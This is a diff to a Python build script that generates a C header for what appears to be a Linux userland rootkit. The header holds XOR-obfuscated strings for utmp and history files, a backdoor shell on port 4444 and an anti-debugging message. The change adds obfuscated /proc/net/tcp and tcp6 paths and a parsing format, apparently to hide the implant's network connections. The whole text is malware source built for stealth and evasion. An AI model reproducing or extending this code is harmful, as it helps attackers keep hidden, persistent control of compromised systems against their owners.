@@ -28,6 +28,11 @@ header_template = '''#define _GNU_SOURCE
 #define UTMP_FILE_X\t"{utmp_file}"
 #define SYS_WRITE\t"{sys_write}"
 #define SYS_READ\t"{sys_read}"
+#define PROC_PATH\t"{proc_path}"
+
+#define PROC_NET_TCP\t"{proc_net_tcp}"
+#define PROC_NET_TCP6\t"{proc_net_tcp6}"
+#define SCANF_LINE\t"{scanf_line}"
 
 #define SHELL_TYPE\t"{shell_type}"
 #define SHELL_MSG\t"{shell_msg}"
@@ -37,7 +42,6 @@ header_template = '''#define _GNU_SOURCE
 #define HIST_FILE\t"{hist_file}"
 #define TERM\t"{term}"
 #define CMD_PROC_NAME\t"{cmd_proc_name}"
-#define PROC_PATH\t"{proc_path}"
 #define ANTI_DEBUG_MSG\t"{anti_debug_msg}"
 
 #define MAX_LEN 1024
@@ -106,7 +110,10 @@ header = header_template.format(
     shell_server_port=4444,
     cmd_proc_name=xor("/proc/%d/status"),
     proc_path=xor("/proc/"),
-    anti_debug_msg=xor("Don't scratch the walls")
+    anti_debug_msg=xor("Don't scratch the walls"),
+    proc_net_tcp=xor("/proc/net/tcp"),
+    proc_net_tcp6=xor("/proc/net/tcp6"),
+    scanf_line=xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n")
 )
 
 # XOR the syscall names and format them into a list
